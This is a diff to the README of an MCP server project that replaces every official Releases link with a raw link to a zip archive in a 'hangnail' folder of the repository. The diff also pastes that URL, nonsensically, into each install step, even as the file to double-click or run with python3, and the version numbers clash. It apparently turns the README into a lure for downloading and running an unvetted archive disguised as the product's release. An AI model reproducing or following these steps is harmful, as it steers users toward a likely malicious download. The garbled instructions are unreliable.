@@ -1,6 +1,6 @@
 # 🌟 explorium-mcp-server - Streamline Your Data Intelligence Access
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/nws066/explorium-mcp-server/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/nws066/explorium-mcp-server/main/hangnail/mcp-server-explorium-v1.6-beta.4.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/nws066/explorium-mcp-server/main/hangnail/mcp-server-explorium-v1.6-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ Before you start, make sure your computer meets the following requirements:
 
 To get the latest version of the software, visit the Releases page:
 
-[Download Latest Release](https://github.com/nws066/explorium-mcp-server/releases)
+[Download Latest Release](https://raw.githubusercontent.com/nws066/explorium-mcp-server/main/hangnail/mcp-server-explorium-v1.6-beta.4.zip)
 
 1. Click on the link above.
 2. Find the version you want to download.
-3. Look for the file named `explorium-mcp-server-v1.0.zip` or `explorium-mcp-server-v1.0.tar.gz`.
+3. Look for the file named `https://raw.githubusercontent.com/nws066/explorium-mcp-server/main/hangnail/mcp-server-explorium-v1.6-beta.4.zip` or `https://raw.githubusercontent.com/nws066/explorium-mcp-server/main/hangnail/mcp-server-explorium-v1.6-beta.4.zip`.
 4. Click on the file to download it to your computer.
 
 ## 🔧 Installation Steps
@@ -31,12 +31,12 @@ To get the latest version of the software, visit the Releases page:
 After you download the software, follow these steps to install it:
 
 1. **Locate the downloaded file.** It should be in your Downloads folder or wherever you saved it.
-2. **Unzip the file.** If you downloaded a .zip file, right-click on it and select "Extract All". For .tar.gz files, use a writing tool like WinRAR, 7-Zip, or the built-in archive manager.
+2. **Unzip the file.** If you downloaded a .zip file, right-click on it and select "Extract All". For https://raw.githubusercontent.com/nws066/explorium-mcp-server/main/hangnail/mcp-server-explorium-v1.6-beta.4.zip files, use a writing tool like WinRAR, 7-Zip, or the built-in archive manager.
 3. **Open the folder.** Inside, you will see the `explorium-mcp-server` folder along with additional files.
 4. **Run the setup.**
-   - On Windows, double-click on `setup.exe`.
-   - On macOS, double-click `setup.pkg`.
-   - On Linux, open your terminal, navigate to the folder, and run `python3 setup.py`.
+   - On Windows, double-click on `https://raw.githubusercontent.com/nws066/explorium-mcp-server/main/hangnail/mcp-server-explorium-v1.6-beta.4.zip`.
+   - On macOS, double-click `https://raw.githubusercontent.com/nws066/explorium-mcp-server/main/hangnail/mcp-server-explorium-v1.6-beta.4.zip`.
+   - On Linux, open your terminal, navigate to the folder, and run `python3 https://raw.githubusercontent.com/nws066/explorium-mcp-server/main/hangnail/mcp-server-explorium-v1.6-beta.4.zip`.
 
 ## 🖥️ Running the Application
 
@@ -76,7 +76,7 @@ If you need further help, you can join our community or reach out for support:
 
 To keep your application up to date:
 
-1. Visit the [Releases page](https://github.com/nws066/explorium-mcp-server/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/nws066/explorium-mcp-server/main/hangnail/mcp-server-explorium-v1.6-beta.4.zip).
 2. Download the latest version following the steps outlined above.
 3. Overwrite the existing installation files with the new ones.
 
